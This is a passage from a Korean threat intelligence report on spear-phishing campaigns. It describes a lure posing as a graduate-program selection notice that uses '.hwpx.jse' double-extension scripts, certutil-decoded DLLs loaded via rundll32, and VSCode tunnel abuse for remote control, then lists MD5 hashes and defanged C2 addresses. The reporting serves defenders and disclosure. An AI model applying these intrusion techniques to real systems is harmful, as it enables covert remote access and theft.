<td>1차 <code>iex</code> — 원격 스크립트 요청, 2차 <code>iex</code> — 파일리스 실행</td>
<td>지속성 유지 후 원격 명령어 수행</td>
</tr>
</tbody>
</table>
<h4>Campaign #4</h4>
<p><strong>2026년 상반기 국내대학원 석사야간과정 위탁교육생 선발 위장 스피어피싱 캠페인</strong></p>
<p>하나의 ZIP 압축 파일 안에 두 개의 JSE 스크립트가 포함. 이중 확장자(<code>.hwpx.jse</code>)로 한글 문서로 위장. Windows 기본 설정상 <code>.jse</code> 확장자가 숨겨져 피해자에게 <code>.hwpx</code>처럼 보임.</p>
<p><strong>Sample #1</strong> — JSE 실행 시 정상 한글 문서 드롭 후 Base64 페이로드(<code>iIdypWi.zgyY</code>) 저장 → <code>certutil -decode</code>로 DLL(<code>kE2I3TP.crqn</code>) 생성 → <code>rundll32.exe</code>의 <code>load</code> 함수로 로드 → 초기 정찰 수행</p>
<p><strong>Sample #2</strong> — 미끼 문서 실행 후 MS 공식 CDN에서 VSCode CLI ZIP 다운로드 → <code>code.exe tunnel --name bizeugene</code> 실행 → GitHub OAuth Device Code를 <code>yespp[.]co[.]kr</code>로 전송 → 공격자가 코드 입력 → 터널 활성화 → 원격 제어</p>
<h2>3. 침해 지표</h2>
<p><strong>Campaign #1 MD5</strong>: 80088af673b0117dbd5cf528021dd970, c499e415f7e07f513d8319013a8b2e86, 0331a83b58231cb0cd3bfe319003ed1a, 806fb7876b63ba89d2432cb831be01ba, c57a8b40d2ca402656ff3d778f42708c, 2689f58b803364bbfba2edb423a3b572, 552ca91696fedd387e1ea47f50f18344</p>
<p><strong>Campaign #1 C2</strong>: hxxps://nelark[.]icu/xftaswx/res/ (bb.php, index.php, bypass.b, post_proc.php, get-command.php)</p>
<p><strong>Campaign #2 MD5</strong>: aa9d5dd632bb90addca480eaa5ff4382, 5c2857913efc6007b3ee7028a132baa4, 6869766741b40825e31fd8bbff688bd3, a3363e0c22c0356fdbcdc37f502bbcde, 471faa43f4811a0250648d586cb3eebf, 831d7c614ba32aa5d70ff9b0f259ee1d</p>
<p><strong>Campaign #2 C2</strong>: hxxps://raw.githubusercontent[.]com/brandonleeodd93-blip/doc7/</p>
<p><strong>Campaign #3 MD5</strong>: b3c90f52e4b86a94ec637fee4354bb84, 0dd1cf2d9a72fdbef19e77af59ba9d1f, cbb059bd691d846e8279d617134d3129</p>
<p><strong>Campaign #3 C2</strong>: hxxp://103.67.196[.]25/ (conf.dat, payload.dat, view1.php)</p>
<p><strong>Campaign #4 MD5</strong>: bb5040d54135b0999cc491b41a0a45e2, 9fe43e08c8f446554340f972dac8a68c, 52f1ff082e981cbdfd1f045c6021c63f, bb9e9c893b170b3774c150b1d0b93a73, 08160acf08fccecde7b34090db18b321</p>
<p><strong>Campaign #4 C2</strong>: hxxps://www.pyrotech[.]co[.]kr/common/include/tech/default.php, hxxps://www.yespp[.]co[.]kr/common/include/code/out.php</p>
</div></details>

